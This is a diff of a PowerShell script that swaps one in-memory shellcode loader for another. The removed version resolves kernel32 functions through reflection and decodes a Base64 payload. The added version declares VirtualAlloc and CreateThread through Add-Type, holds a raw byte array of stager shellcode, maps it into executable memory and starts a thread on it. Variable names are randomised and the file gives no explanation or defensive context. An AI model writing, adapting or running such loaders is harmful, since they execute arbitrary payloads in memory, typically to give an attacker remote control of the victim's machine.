@@ -1,29 +1,17 @@
-function l8y {
-        Param ($qssn4, $jn)
-        $jHNol = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetTyp>
+$yNbDDkmwkmSv = @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThre>
+"@
 
-        return $jHNol.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.H>
-}
+$JKoPvedoB = Add-Type -memberDefinition $yNbDDkmwkmSv -Name "Win32" -namespace Win32Functions -passthru
 
-function hnA {
-        Param (
-                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $b32A6,
-                [Parameter(Position = 1)] [Type] $deD = [Void]
-        )
+[Byte[]] $mZCslWvu = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0>
 
-        $r6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBui>
-        $r6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $b32A6).SetImplementationFlags('Runtime, Managed>
-        $r6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $deD, $b32A6).SetImplementationFlags('Runtime, Managed')
 
-        return $r6.CreateType()
-}
+$ooursOTo = $JKoPvedoB::VirtualAlloc(0,[Math]::Max($mZCslWvu.Length,0x1000),0x3000,0x40)
 
-[Byte[]]$qVL6_ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRSItSGEiLUiBWSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwI>
-[Uint32]$ftbQ9 = 0
-$own = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll VirtualAlloc), (hnA @([IntPtr], [UInt32], [UInt32], [UInt32]) ([Int>
+[System.Runtime.InteropServices.Marshal]::Copy($mZCslWvu,0,$ooursOTo,$mZCslWvu.Length)
 
-[System.Runtime.InteropServices.Marshal]::Copy($qVL6_, 0, $own, $qVL6_.length)
-if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll VirtualProtect), (hnA @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeB>
-        $geQZa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll CreateThread), (hnA @([IntPtr], [UInt32], [IntPtr], [IntP>
-        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll WaitForSingleObject), (hnA @([IntPtr], [Int32]))).Invoke($geQZa,0x>
-}
+$JKoPvedoB::CreateThread(0,0,$ooursOTo,0,0,0)
